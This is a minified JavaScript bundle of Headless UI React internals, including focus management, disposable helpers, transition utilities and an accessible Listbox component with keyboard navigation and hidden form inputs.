function i$3(e,o){let[u,t]=useState(e),r=s$5(e);return l$3(()=>t(r.current),[r,t,...o]),u}

let o$6=function(t){let e=s$5(t);return React__default.useCallback((...r)=>e.current(...r),[e])};

function T$2(l,r,c){let[i,s]=useState(c),e=l!==void 0,t=useRef(e),u=useRef(false),d=useRef(false);return e&&!t.current&&!u.current?(u.current=true,t.current=e,console.error("A component is changing from uncontrolled to controlled. This may be caused by the value changing from undefined to a defined value, which should not happen.")):!e&&t.current&&!d.current&&(d.current=true,t.current=e,console.error("A component is changing from controlled to uncontrolled. This may be caused by the value changing from a defined value to undefined, which should not happen.")),[e?l:i,o$6(n=>(e||s(n),r==null?void 0:r(n)))]}

function t$3(e){typeof queueMicrotask=="function"?queueMicrotask(e):Promise.resolve().then(e).catch(o=>setTimeout(()=>{throw o}));}

function o$5(){let n=[],r={addEventListener(e,t,s,a){return e.addEventListener(t,s,a),r.add(()=>e.removeEventListener(t,s,a))},requestAnimationFrame(...e){let t=requestAnimationFrame(...e);return r.add(()=>cancelAnimationFrame(t))},nextFrame(...e){return r.requestAnimationFrame(()=>r.requestAnimationFrame(...e))},setTimeout(...e){let t=setTimeout(...e);return r.add(()=>clearTimeout(t))},microTask(...e){let t={current:true};return t$3(()=>{t.current&&e[0]();}),r.add(()=>{t.current=false;})},style(e,t,s){let a=e.style.getPropertyValue(t);return Object.assign(e.style,{[t]:s}),this.add(()=>{Object.assign(e.style,{[t]:a});})},group(e){let t=o$5();return e(t),this.add(()=>t.dispose())},add(e){return n.push(e),()=>{let t=n.indexOf(e);if(t>=0)for(let s of n.splice(t,1))s();}},dispose(){for(let e of n.splice(0))e();}};return r}

function p$1(){let[e]=useState(o$5);return useEffect(()=>()=>e.dispose(),[e]),e}

function s$4(){let r=typeof document=="undefined";return "useSyncExternalStore"in React?(o=>o.useSyncExternalStore)(React)(()=>()=>{},()=>false,()=>!r):false}function l$2(){let r=s$4(),[e,n]=React.useState(s$6.isHandoffComplete);return e&&s$6.isHandoffComplete===false&&n(false),React.useEffect(()=>{e!==true&&n(true);},[e]),React.useEffect(()=>s$6.handoff(),[]),r?false:e}

var o$4;let I$2=(o$4=React__default.useId)!=null?o$4:function(){let n=l$2(),[e,u]=React__default.useState(n?()=>s$6.nextId():null);return l$3(()=>{e===null&&u(s$6.nextId());},[e]),e!=null?""+e:void 0};

function u$5(r,n,...a){if(r in n){let e=n[r];return typeof e=="function"?e(...a):e}let t=new Error(`Tried to handle "${r}" but there is no handler defined. Only defined handlers are: ${Object.keys(n).map(e=>`"${e}"`).join(", ")}.`);throw Error.captureStackTrace&&Error.captureStackTrace(t,u$5),t}

function o$3(r){return s$6.isServer?null:r instanceof Node?r.ownerDocument:r!=null&&r.hasOwnProperty("current")&&r.current instanceof Node?r.current.ownerDocument:document}

let c$2=["[contentEditable=true]","[tabindex]","a[href]","area[href]","button:not([disabled])","iframe","input:not([disabled])","select:not([disabled])","textarea:not([disabled])"].map(e=>`${e}:not([tabindex='-1'])`).join(",");var M$2=(n=>(n[n.First=1]="First",n[n.Previous=2]="Previous",n[n.Next=4]="Next",n[n.Last=8]="Last",n[n.WrapAround=16]="WrapAround",n[n.NoScroll=32]="NoScroll",n))(M$2||{}),N=(o=>(o[o.Error=0]="Error",o[o.Overflow=1]="Overflow",o[o.Success=2]="Success",o[o.Underflow=3]="Underflow",o))(N||{}),F$1=(t=>(t[t.Previous=-1]="Previous",t[t.Next=1]="Next",t))(F$1||{});var T$1=(t=>(t[t.Strict=0]="Strict",t[t.Loose=1]="Loose",t))(T$1||{});function h(e,r=0){var t;return e===((t=o$3(e))==null?void 0:t.body)?false:u$5(r,{[0](){return e.matches(c$2)},[1](){let l=e;for(;l!==null;){if(l.matches(c$2))return  true;l=l.parentElement;}return  false}})}var w$1=(t=>(t[t.Keyboard=0]="Keyboard",t[t.Mouse=1]="Mouse",t))(w$1||{});typeof window!="undefined"&&typeof document!="undefined"&&(document.addEventListener("keydown",e=>{e.metaKey||e.altKey||e.ctrlKey||(document.documentElement.dataset.headlessuiFocusVisible="");},true),document.addEventListener("click",e=>{e.detail===1?delete document.documentElement.dataset.headlessuiFocusVisible:e.detail===0&&(document.documentElement.dataset.headlessuiFocusVisible="");},true));function I$1(e,r=t=>t){return e.slice().sort((t,l)=>{let o=r(t),i=r(l);if(o===null||i===null)return 0;let n=o.compareDocumentPosition(i);return n&Node.DOCUMENT_POSITION_FOLLOWING?-1:n&Node.DOCUMENT_POSITION_PRECEDING?1:0})}

function t$2(){return /iPhone/gi.test(window.navigator.platform)||/Mac/gi.test(window.navigator.platform)&&window.navigator.maxTouchPoints>0}function i$2(){return /Android/gi.test(window.navigator.userAgent)}function n$1(){return t$2()||i$2()}

function d$1(e,r,n){let o=s$5(r);useEffect(()=>{function t(u){o.current(u);}return document.addEventListener(e,t,n),()=>document.removeEventListener(e,t,n)},[e,n]);}

function s$3(e,r,n){let o=s$5(r);useEffect(()=>{function t(i){o.current(i);}return window.addEventListener(e,t,n),()=>window.removeEventListener(e,t,n)},[e,n]);}

function y$1(s,m,a=true){let i=useRef(false);useEffect(()=>{requestAnimationFrame(()=>{i.current=a;});},[a]);function c(e,r){if(!i.current||e.defaultPrevented)return;let t=r(e);if(t===null||!t.getRootNode().contains(t)||!t.isConnected)return;let E=function u(n){return typeof n=="function"?u(n()):Array.isArray(n)||n instanceof Set?n:[n]}(s);for(let u of E){if(u===null)continue;let n=u instanceof HTMLElement?u:u.current;if(n!=null&&n.contains(t)||e.composed&&e.composedPath().includes(n))return}return !h(t,T$1.Loose)&&t.tabIndex!==-1&&e.preventDefault(),m(e,t)}let o=useRef(null);d$1("pointerdown",e=>{var r,t;i.current&&(o.current=((t=(r=e.composedPath)==null?void 0:r.call(e))==null?void 0:t[0])||e.target);},true),d$1("mousedown",e=>{var r,t;i.current&&(o.current=((t=(r=e.composedPath)==null?void 0:r.call(e))==null?void 0:t[0])||e.target);},true),d$1("click",e=>{n$1()||o.current&&(c(e,()=>o.current),o.current=null);},true),d$1("touchend",e=>c(e,()=>e.target instanceof HTMLElement?e.target:null),true),s$3("blur",e=>c(e,()=>window.document.activeElement instanceof HTMLIFrameElement?window.document.activeElement:null),true);}

function i$1(t){var n;if(t.type)return t.type;let e=(n=t.as)!=null?n:"button";if(typeof e=="string"&&e.toLowerCase()==="button")return "button"}function T(t,e){let[n,u]=useState(()=>i$1(t));return l$3(()=>{u(i$1(t));},[t.type,t.as]),l$3(()=>{n||e.current&&e.current instanceof HTMLButtonElement&&!e.current.hasAttribute("type")&&u("button");},[n,e]),n}

let u$4=Symbol();function y(...t){let n=useRef(t);useEffect(()=>{n.current=t;},[t]);let c=o$6(e=>{for(let o of n.current)o!=null&&(typeof o=="function"?o(e):o.current=e);});return t.every(e=>e==null||(e==null?void 0:e[u$4]))?void 0:c}

function t$1(e){return [e.screenX,e.screenY]}function u$3(){let e=useRef([-1,-1]);return {wasMoved(r){let n=t$1(r);return e.current[0]===n[0]&&e.current[1]===n[1]?false:(e.current=n,true)},update(r){e.current=t$1(r);}}}

function t(...r){return Array.from(new Set(r.flatMap(n=>typeof n=="string"?n.split(" "):[]))).filter(Boolean).join(" ")}

var O=(n=>(n[n.None=0]="None",n[n.RenderStrategy=1]="RenderStrategy",n[n.Static=2]="Static",n))(O||{}),v$1=(e=>(e[e.Unmount=0]="Unmount",e[e.Hidden=1]="Hidden",e))(v$1||{});function C({ourProps:r,theirProps:t,slot:e,defaultTag:n,features:o,visible:a=true,name:f,mergeRefs:l}){l=l!=null?l:k$1;let s=R(t,r);if(a)return m(s,e,n,f,l);let y=o!=null?o:0;if(y&2){let{static:u=false,...d}=s;if(u)return m(d,e,n,f,l)}if(y&1){let{unmount:u=true,...d}=s;return u$5(u?0:1,{[0](){return null},[1](){return m({...d,hidden:true,style:{display:"none"}},e,n,f,l)}})}return m(s,e,n,f,l)}function m(r,t$1={},e,n,o){let{as:a=e,children:f,refName:l="ref",...s}=F(r,["unmount","static"]),y=r.ref!==void 0?{[l]:r.ref}:{},u=typeof f=="function"?f(t$1):f;"className"in s&&s.className&&typeof s.className=="function"&&(s.className=s.className(t$1));let d={};if(t$1){let i=false,c=[];for(let[T,p]of Object.entries(t$1))typeof p=="boolean"&&(i=true),p===true&&c.push(T);i&&(d["data-headlessui-state"]=c.join(" "));}if(a===Fragment&&Object.keys(x(s)).length>0){if(!isValidElement(u)||Array.isArray(u)&&u.length>1)throw new Error(['Passing props on "Fragment"!',"",`The current component <${n} /> is rendering a "Fragment".`,"However we need to passthrough the following props:",Object.keys(s).map(p=>`  - ${p}`).join(`
`),"","You can apply a few solutions:",['Add an `as="..."` prop, to ensure that we render an actual element instead of a "Fragment".',"Render a single element as the child so that we can forward the props onto that element."].map(p=>`  - ${p}`).join(`
`)].join(`
`));let i=u.props,c=typeof(i==null?void 0:i.className)=="function"?(...p)=>t(i==null?void 0:i.className(...p),s.className):t(i==null?void 0:i.className,s.className),T=c?{className:c}:{};return cloneElement(u,Object.assign({},R(u.props,x(F(s,["ref"]))),d,y,{ref:o(u.ref,y.ref)},T))}return createElement(a,Object.assign({},F(s,["ref"]),a!==Fragment&&y,a!==Fragment&&d),u)}function k$1(...r){return r.every(t=>t==null)?void 0:t=>{for(let e of r)e!=null&&(typeof e=="function"?e(t):e.current=t);}}function R(...r){if(r.length===0)return {};if(r.length===1)return r[0];let t={},e={};for(let o of r)for(let a in o)a.startsWith("on")&&typeof o[a]=="function"?((e[a])!=null||(e[a]=[]),e[a].push(o[a])):t[a]=o[a];if(t.disabled||t["aria-disabled"])return Object.assign(t,Object.fromEntries(Object.keys(e).map(o=>[o,void 0])));for(let o in e)Object.assign(t,{[o](a,...f){let l=e[o];for(let s of l){if((a instanceof Event||(a==null?void 0:a.nativeEvent)instanceof Event)&&a.defaultPrevented)return;s(a,...f);}}});return t}function U$1(r){var t;return Object.assign(forwardRef(r),{displayName:(t=r.displayName)!=null?t:r.name})}function x(r){let t=Object.assign({},r);for(let e in t)t[e]===void 0&&delete t[e];return t}function F(r,t=[]){let e=Object.assign({},r);for(let n of t)n in e&&delete e[n];return e}

let p="div";var s$2=(e=>(e[e.None=1]="None",e[e.Focusable=2]="Focusable",e[e.Hidden=4]="Hidden",e))(s$2||{});function l$1(d,o){var n;let{features:t=1,...e}=d,r={ref:o,"aria-hidden":(t&2)===2?true:(n=e["aria-hidden"])!=null?n:void 0,hidden:(t&4)===4?true:void 0,style:{position:"fixed",top:1,left:1,width:1,height:0,padding:0,margin:-1,overflow:"hidden",clip:"rect(0, 0, 0, 0)",whiteSpace:"nowrap",borderWidth:"0",...(t&4)===4&&(t&2)!==2&&{display:"none"}}};return C({ourProps:r,theirProps:e,slot:{},defaultTag:p,name:"Hidden"})}let u$2=U$1(l$1);

let n=createContext(null);n.displayName="OpenClosedContext";var d=(e=>(e[e.Open=1]="Open",e[e.Closed=2]="Closed",e[e.Closing=4]="Closing",e[e.Opening=8]="Opening",e))(d||{});function u$1(){return useContext(n)}function s$1({value:o,children:r}){return React__default.createElement(n.Provider,{value:o},r)}

function r(n){let e=n.parentElement,l=null;for(;e&&!(e instanceof HTMLFieldSetElement);)e instanceof HTMLLegendElement&&(l=e),e=e.parentElement;let t=(e==null?void 0:e.getAttribute("disabled"))==="";return t&&i(l)?false:t}function i(n){if(!n)return  false;let e=n.previousElementSibling;for(;e!==null;){if(e instanceof HTMLLegendElement)return  false;e=e.previousElementSibling;}return  true}

function u(l){throw new Error("Unexpected object: "+l)}var c$1=(i=>(i[i.First=0]="First",i[i.Previous=1]="Previous",i[i.Next=2]="Next",i[i.Last=3]="Last",i[i.Specific=4]="Specific",i[i.Nothing=5]="Nothing",i))(c$1||{});function f$2(l,n){let t=n.resolveItems();if(t.length<=0)return null;let r=n.resolveActiveIndex(),s=r!=null?r:-1;switch(l.focus){case 0:{for(let e=0;e<t.length;++e)if(!n.resolveDisabled(t[e],e,t))return e;return r}case 1:{for(let e=s-1;e>=0;--e)if(!n.resolveDisabled(t[e],e,t))return e;return r}case 2:{for(let e=s+1;e<t.length;++e)if(!n.resolveDisabled(t[e],e,t))return e;return r}case 3:{for(let e=t.length-1;e>=0;--e)if(!n.resolveDisabled(t[e],e,t))return e;return r}case 4:{for(let e=0;e<t.length;++e)if(n.resolveId(t[e],e,t)===l.id)return e;return r}case 5:return null;default:u(l);}}

function e(i={},s=null,t=[]){for(let[r,n]of Object.entries(i))o$2(t,f$1(s,r),n);return t}function f$1(i,s){return i?i+"["+s+"]":s}function o$2(i,s,t){if(Array.isArray(t))for(let[r,n]of t.entries())o$2(i,f$1(s,r.toString()),n);else t instanceof Date?i.push([s,t.toISOString()]):typeof t=="boolean"?i.push([s,t?"1":"0"]):typeof t=="string"?i.push([s,t]):typeof t=="number"?i.push([s,`${t}`]):t==null?i.push([s,""]):e(t,s,i);}

var o$1=(r=>(r.Space=" ",r.Enter="Enter",r.Escape="Escape",r.Backspace="Backspace",r.Delete="Delete",r.ArrowLeft="ArrowLeft",r.ArrowUp="ArrowUp",r.ArrowRight="ArrowRight",r.ArrowDown="ArrowDown",r.Home="Home",r.End="End",r.PageUp="PageUp",r.PageDown="PageDown",r.Tab="Tab",r))(o$1||{});

function f(){let e=useRef(false);return l$3(()=>(e.current=true,()=>{e.current=false;}),[]),e}

let a=/([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g;function o(e){var r,i;let n=(r=e.innerText)!=null?r:"",t=e.cloneNode(true);if(!(t instanceof HTMLElement))return n;let u=false;for(let f of t.querySelectorAll('[hidden],[aria-hidden],[role="img"]'))f.remove(),u=true;let l=u?(i=t.innerText)!=null?i:"":n;return a.test(l)&&(l=l.replace(a,"")),l}function g$1(e){let n=e.getAttribute("aria-label");if(typeof n=="string")return n.trim();let t=e.getAttribute("aria-labelledby");if(t){let u=t.split(" ").map(l=>{let r=document.getElementById(l);if(r){let i=r.getAttribute("aria-label");return typeof i=="string"?i.trim():o(r).trim()}return null}).filter(Boolean);if(u.length>0)return u.join(", ")}return o(e).trim()}

function s(c){let t=useRef(""),r=useRef("");return o$6(()=>{let e=c.current;if(!e)return "";let u=e.innerText;if(t.current===u)return r.current;let n=g$1(e).trim().toLowerCase();return t.current=u,r.current=n,n})}

var Be=(n=>(n[n.Open=0]="Open",n[n.Closed=1]="Closed",n))(Be||{}),He$1=(n=>(n[n.Single=0]="Single",n[n.Multi=1]="Multi",n))(He$1||{}),Ge=(n=>(n[n.Pointer=0]="Pointer",n[n.Other=1]="Other",n))(Ge||{}),Ne$1=(i=>(i[i.OpenListbox=0]="OpenListbox",i[i.CloseListbox=1]="CloseListbox",i[i.GoToOption=2]="GoToOption",i[i.Search=3]="Search",i[i.ClearSearch=4]="ClearSearch",i[i.RegisterOption=5]="RegisterOption",i[i.UnregisterOption=6]="UnregisterOption",i[i.RegisterLabel=7]="RegisterLabel",i))(Ne$1||{});function z(e,a=n=>n){let n=e.activeOptionIndex!==null?e.options[e.activeOptionIndex]:null,r=I$1(a(e.options.slice()),t=>t.dataRef.current.domRef.current),l=n?r.indexOf(n):null;return l===-1&&(l=null),{options:r,activeOptionIndex:l}}let je={[1](e){return e.dataRef.current.disabled||e.listboxState===1?e:{...e,activeOptionIndex:null,listboxState:1}},[0](e){if(e.dataRef.current.disabled||e.listboxState===0)return e;let a=e.activeOptionIndex,{isSelected:n}=e.dataRef.current,r=e.options.findIndex(l=>n(l.dataRef.current.value));return r!==-1&&(a=r),{...e,listboxState:0,activeOptionIndex:a}},[2](e,a){var l;if(e.dataRef.current.disabled||e.listboxState===1)return e;let n=z(e),r=f$2(a,{resolveItems:()=>n.options,resolveActiveIndex:()=>n.activeOptionIndex,resolveId:t=>t.id,resolveDisabled:t=>t.dataRef.current.disabled});return {...e,...n,searchQuery:"",activeOptionIndex:r,activationTrigger:(l=a.trigger)!=null?l:1}},[3]:(e,a)=>{if(e.dataRef.current.disabled||e.listboxState===1)return e;let r=e.searchQuery!==""?0:1,l=e.searchQuery+a.value.toLowerCase(),p=(e.activeOptionIndex!==null?e.options.slice(e.activeOptionIndex+r).concat(e.options.slice(0,e.activeOptionIndex+r)):e.options).find(i=>{var b;return !i.dataRef.current.disabled&&((b=i.dataRef.current.textValue)==null?void 0:b.startsWith(l))}),u=p?e.options.indexOf(p):-1;return u===-1||u===e.activeOptionIndex?{...e,searchQuery:l}:{...e,searchQuery:l,activeOptionIndex:u,activationTrigger:1}},[4](e){return e.dataRef.current.disabled||e.listboxState===1||e.searchQuery===""?e:{...e,searchQuery:""}},[5]:(e,a)=>{let n={id:a.id,dataRef:a.dataRef},r=z(e,l=>[...l,n]);return e.activeOptionIndex===null&&e.dataRef.current.isSelected(a.dataRef.current.value)&&(r.activeOptionIndex=r.options.indexOf(n)),{...e,...r}},[6]:(e,a)=>{let n=z(e,r=>{let l=r.findIndex(t=>t.id===a.id);return l!==-1&&r.splice(l,1),r});return {...e,...n,activationTrigger:1}},[7]:(e,a)=>({...e,labelId:a.id})},J=createContext(null);J.displayName="ListboxActionsContext";function k(e){let a=useContext(J);if(a===null){let n=new Error(`<${e} /> is missing a parent <Listbox /> component.`);throw Error.captureStackTrace&&Error.captureStackTrace(n,k),n}return a}let q$1=createContext(null);q$1.displayName="ListboxDataContext";function w(e){let a=useContext(q$1);if(a===null){let n=new Error(`<${e} /> is missing a parent <Listbox /> component.`);throw Error.captureStackTrace&&Error.captureStackTrace(n,w),n}return a}function Ve(e,a){return u$5(a.type,je,e,a)}let Ke=Fragment;function Qe(e$1,a){let{value:n,defaultValue:r,form:l,name:t,onChange:p,by:u=(s,c)=>s===c,disabled:i=false,horizontal:b=false,multiple:R=false,...m}=e$1;const P=b?"horizontal":"vertical";let S=y(a),[g=R?[]:void 0,x$1]=T$2(n,p,r),[T,o]=useReducer(Ve,{dataRef:createRef(),listboxState:1,options:[],searchQuery:"",labelId:null,activeOptionIndex:null,activationTrigger:1}),L=useRef({static:false,hold:false}),U=useRef(null),B=useRef(null),W=useRef(null),I=o$6(typeof u=="string"?(s,c)=>{let O=u;return (s==null?void 0:s[O])===(c==null?void 0:c[O])}:u),A=useCallback(s=>u$5(d$1.mode,{[1]:()=>g.some(c=>I(c,s)),[0]:()=>I(g,s)}),[g]),d$1=useMemo(()=>({...T,value:g,disabled:i,mode:R?1:0,orientation:P,compare:I,isSelected:A,optionsPropsRef:L,labelRef:U,buttonRef:B,optionsRef:W}),[g,i,R,T]);l$3(()=>{T.dataRef.current=d$1;},[d$1]),y$1([d$1.buttonRef,d$1.optionsRef],(s,c)=>{var O;o({type:1}),h(c,T$1.Loose)||(s.preventDefault(),(O=d$1.buttonRef.current)==null||O.focus());},d$1.listboxState===0);let H=useMemo(()=>({open:d$1.listboxState===0,disabled:i,value:g}),[d$1,i,g]),ie=o$6(s=>{let c=d$1.options.find(O=>O.id===s);c&&X(c.dataRef.current.value);}),re=o$6(()=>{if(d$1.activeOptionIndex!==null){let{dataRef:s,id:c}=d$1.options[d$1.activeOptionIndex];X(s.current.value),o({type:2,focus:c$1.Specific,id:c});}}),ae=o$6(()=>o({type:0})),le=o$6(()=>o({type:1})),se=o$6((s,c,O)=>s===c$1.Specific?o({type:2,focus:c$1.Specific,id:c,trigger:O}):o({type:2,focus:s,trigger:O})),pe=o$6((s,c)=>(o({type:5,id:s,dataRef:c}),()=>o({type:6,id:s}))),ue=o$6(s=>(o({type:7,id:s}),()=>o({type:7,id:null}))),X=o$6(s=>u$5(d$1.mode,{[0](){return x$1==null?void 0:x$1(s)},[1](){let c=d$1.value.slice(),O=c.findIndex(C=>I(C,s));return O===-1?c.push(s):c.splice(O,1),x$1==null?void 0:x$1(c)}})),de=o$6(s=>o({type:3,value:s})),ce=o$6(()=>o({type:4})),fe=useMemo(()=>({onChange:X,registerOption:pe,registerLabel:ue,goToOption:se,closeListbox:le,openListbox:ae,selectActiveOption:re,selectOption:ie,search:de,clearSearch:ce}),[]),Te={ref:S},G=useRef(null),be=p$1();return useEffect(()=>{G.current&&r!==void 0&&be.addEventListener(G.current,"reset",()=>{x$1==null||x$1(r);});},[G,x$1]),React__default.createElement(J.Provider,{value:fe},React__default.createElement(q$1.Provider,{value:d$1},React__default.createElement(s$1,{value:u$5(d$1.listboxState,{[0]:d.Open,[1]:d.Closed})},t!=null&&g!=null&&e({[t]:g}).map(([s,c],O)=>React__default.createElement(u$2,{features:s$2.Hidden,ref:O===0?C=>{var Y;G.current=(Y=C==null?void 0:C.closest("form"))!=null?Y:null;}:void 0,...x({key:s,as:"input",type:"hidden",hidden:true,readOnly:true,form:l,disabled:i,name:s,value:c})})),C({ourProps:Te,theirProps:m,slot:H,defaultTag:Ke,name:"Listbox"}))))}let We="button";function Xe(e,a){var x;let n=I$2(),{id:r$1=`headlessui-listbox-button-${n}`,...l}=e,t=w("Listbox.Button"),p=k("Listbox.Button"),u=y(t.buttonRef,a),i=p$1(),b=o$6(T=>{switch(T.key){case o$1.Space:case o$1.Enter:case o$1.ArrowDown:T.preventDefault(),p.openListbox(),i.nextFrame(()=>{t.value||p.goToOption(c$1.First);});break;case o$1.ArrowUp:T.preventDefault(),p.openListbox(),i.nextFrame(()=>{t.value||p.goToOption(c$1.Last);});break}}),R=o$6(T=>{switch(T.key){case o$1.Space:T.preventDefault();break}}),m=o$6(T=>{if(r(T.currentTarget))return T.preventDefault();t.listboxState===0?(p.closeListbox(),i.nextFrame(()=>{var o;return (o=t.buttonRef.current)==null?void 0:o.focus({preventScroll:true})})):(T.preventDefault(),p.openListbox());}),P=i$3(()=>{if(t.labelId)return [t.labelId,r$1].join(" ")},[t.labelId,r$1]),S=useMemo(()=>({open:t.listboxState===0,disabled:t.disabled,value:t.value}),[t]),g={ref:u,id:r$1,type:T(e,t.buttonRef),"aria-haspopup":"listbox","aria-controls":(x=t.optionsRef.current)==null?void 0:x.id,"aria-expanded":t.listboxState===0,"aria-labelledby":P,disabled:t.disabled,onKeyDown:b,onKeyUp:R,onClick:m};return C({ourProps:g,theirProps:l,slot:S,defaultTag:We,name:"Listbox.Button"})}let $e="label";function ze(e,a){let n=I$2(),{id:r=`headlessui-listbox-label-${n}`,...l}=e,t=w("Listbox.Label"),p=k("Listbox.Label"),u=y(t.labelRef,a);l$3(()=>p.registerLabel(r),[r]);let i=o$6(()=>{var m;return (m=t.buttonRef.current)==null?void 0:m.focus({preventScroll:true})}),b=useMemo(()=>({open:t.listboxState===0,disabled:t.disabled}),[t]);return C({ourProps:{ref:u,id:r,onClick:i},theirProps:l,slot:b,defaultTag:$e,name:"Listbox.Label"})}let Je="ul",qe$1=O.RenderStrategy|O.Static;function Ye(e,a){var T;let n=I$2(),{id:r=`headlessui-listbox-options-${n}`,...l}=e,t=w("Listbox.Options"),p=k("Listbox.Options"),u=y(t.optionsRef,a),i=p$1(),b=p$1(),R=u$1(),m=(()=>R!==null?(R&d.Open)===d.Open:t.listboxState===0)();useEffect(()=>{var L;let o=t.optionsRef.current;o&&t.listboxState===0&&o!==((L=o$3(o))==null?void 0:L.activeElement)&&o.focus({preventScroll:true});},[t.listboxState,t.optionsRef]);let P=o$6(o=>{switch(b.dispose(),o.key){case o$1.Space:if(t.searchQuery!=="")return o.preventDefault(),o.stopPropagation(),p.search(o.key);case o$1.Enter:if(o.preventDefault(),o.stopPropagation(),t.activeOptionIndex!==null){let{dataRef:L}=t.options[t.activeOptionIndex];p.onChange(L.current.value);}t.mode===0&&(p.closeListbox(),o$5().nextFrame(()=>{var L;return (L=t.buttonRef.current)==null?void 0:L.focus({preventScroll:true})}));break;case u$5(t.orientation,{vertical:o$1.ArrowDown,horizontal:o$1.ArrowRight}):return o.preventDefault(),o.stopPropagation(),p.goToOption(c$1.Next);case u$5(t.orientation,{vertical:o$1.ArrowUp,horizontal:o$1.ArrowLeft}):return o.preventDefault(),o.stopPropagation(),p.goToOption(c$1.Previous);case o$1.Home:case o$1.PageUp:return o.preventDefault(),o.stopPropagation(),p.goToOption(c$1.First);case o$1.End:case o$1.PageDown:return o.preventDefault(),o.stopPropagation(),p.goToOption(c$1.Last);case o$1.Escape:return o.preventDefault(),o.stopPropagation(),p.closeListbox(),i.nextFrame(()=>{var L;return (L=t.buttonRef.current)==null?void 0:L.focus({preventScroll:true})});case o$1.Tab:o.preventDefault(),o.stopPropagation();break;default:o.key.length===1&&(p.search(o.key),b.setTimeout(()=>p.clearSearch(),350));break}}),S=i$3(()=>{var o;return (o=t.buttonRef.current)==null?void 0:o.id},[t.buttonRef.current]),g=useMemo(()=>({open:t.listboxState===0}),[t]),x={"aria-activedescendant":t.activeOptionIndex===null||(T=t.options[t.activeOptionIndex])==null?void 0:T.id,"aria-multiselectable":t.mode===1?true:void 0,"aria-labelledby":S,"aria-orientation":t.orientation,id:r,onKeyDown:P,role:"listbox",tabIndex:0,ref:u};return C({ourProps:x,theirProps:l,slot:g,defaultTag:Je,features:qe$1,visible:m,name:"Listbox.Options"})}let Ze="li";function et(e,a){let n=I$2(),{id:r=`headlessui-listbox-option-${n}`,disabled:l=false,value:t,...p}=e,u=w("Listbox.Option"),i=k("Listbox.Option"),b=u.activeOptionIndex!==null?u.options[u.activeOptionIndex].id===r:false,R=u.isSelected(t),m=useRef(null),P=s(m),S=s$5({disabled:l,value:t,domRef:m,get textValue(){return P()}}),g=y(a,m);l$3(()=>{if(u.listboxState!==0||!b||u.activationTrigger===0)return;let A=o$5();return A.requestAnimationFrame(()=>{var d,H;(H=(d=m.current)==null?void 0:d.scrollIntoView)==null||H.call(d,{block:"nearest"});}),A.dispose},[m,b,u.listboxState,u.activationTrigger,u.activeOptionIndex]),l$3(()=>i.registerOption(r,S),[S,r]);let x=o$6(A=>{if(l)return A.preventDefault();i.onChange(t),u.mode===0&&(i.closeListbox(),o$5().nextFrame(()=>{var d;return (d=u.buttonRef.current)==null?void 0:d.focus({preventScroll:true})}));}),T=o$6(()=>{if(l)return i.goToOption(c$1.Nothing);i.goToOption(c$1.Specific,r);}),o=u$3(),L=o$6(A=>o.update(A)),U=o$6(A=>{o.wasMoved(A)&&(l||b||i.goToOption(c$1.Specific,r,0));}),B=o$6(A=>{o.wasMoved(A)&&(l||b&&i.goToOption(c$1.Nothing));}),W=useMemo(()=>({active:b,selected:R,disabled:l}),[b,R,l]);return C({ourProps:{id:r,ref:g,role:"option",tabIndex:l===true?void 0:-1,"aria-disabled":l===true?true:void 0,"aria-selected":R,disabled:void 0,onClick:x,onFocus:T,onPointerEnter:L,onMouseEnter:L,onPointerMove:U,onMouseMove:U,onPointerLeave:B,onMouseLeave:B},theirProps:p,slot:W,defaultTag:Ze,name:"Listbox.Option"})}let tt=U$1(Qe),ot=U$1(Xe),nt=U$1(ze),it=U$1(Ye),rt=U$1(et),It=Object.assign(tt,{Button:ot,Label:nt,Options:it,Option:rt});

function c(a=0){let[l,r]=useState(a),t=f(),o=useCallback(e=>{t.current&&r(u=>u|e);},[l,t]),m=useCallback(e=>Boolean(l&e),[l]),s=useCallback(e=>{t.current&&r(u=>u&~e);},[r,t]),g=useCallback(e=>{t.current&&r(u=>u^e);},[r]);return {flags:l,addFlag:o,hasFlag:m,removeFlag:s,toggleFlag:g}}

function l(r){let e={called:false};return (...t)=>{if(!e.called)return e.called=true,r(...t)}}

function g(t,...e){t&&e.length>0&&t.classList.add(...e);}function v(t,...e){t&&e.length>0&&t.classList.remove(...e);}function b(t,e){let n=o$5();if(!t)return n.dispose;let{transitionDuration:m,transitionDelay:a}=getComputedStyle(t),[u,p]=[m,a].map(l=>{let[r=0]=l.split(",").filter(Boolean).map(i=>i.includes("ms")?parseFloat(i):parseFloat(i)*1e3).sort((i,T)=>T-i);return r}),o=u+p;if(o!==0){n.group(r=>{r.setTimeout(()=>{e(),r.dispose();},o),r.addEventListener(t,"transitionrun",i=>{i.target===i.currentTarget&&r.dispose();});});let l=n.addEventListener(t,"transitionend",r=>{r.target===r.currentTarget&&(e(),l());});}else e();return n.add(()=>e()),n.dispose}function M$1(t,e,n,m){let a=n?"enter":"leave",u=o$5(),p=m!==void 0?l(m):()=>{};a==="enter"&&(t.removeAttribute("hidden"),t.style.display="");let o=u$5(a,{enter:()=>e.enter,leave:()=>e.leave}),l$1=u$5(a,{enter:()=>e.enterTo,leave:()=>e.leaveTo}),r=u$5(a,{enter:()=>e.enterFrom,leave:()=>e.leaveFrom});return v(t,...e.base,...e.enter,...e.enterTo,...e.enterFrom,...e.leave,...e.leaveFrom,...e.leaveTo,...e.entered),g(t,...e.base,...o,...r),u.nextFrame(()=>{v(t,...e.base,...o,...r),g(t,...e.base,...o,...l$1),b(t,()=>(v(t,...e.base,...o),g(t,...e.base,...e.entered),p()));}),u.dispose}

function D({immediate:t,container:s,direction:n,classes:u,onStart:a,onStop:c}){let l=f(),d=p$1(),e=s$5(n);l$3(()=>{t&&(e.current="enter");},[t]),l$3(()=>{let r=o$5();d.add(r.dispose);let i=s.current;if(i&&e.current!=="idle"&&l.current)return r.dispose(),a.current(e.current),r.add(M$1(i,u.current,e.current==="enter",()=>{r.dispose(),c.current(e.current);})),r.dispose},[n]);}

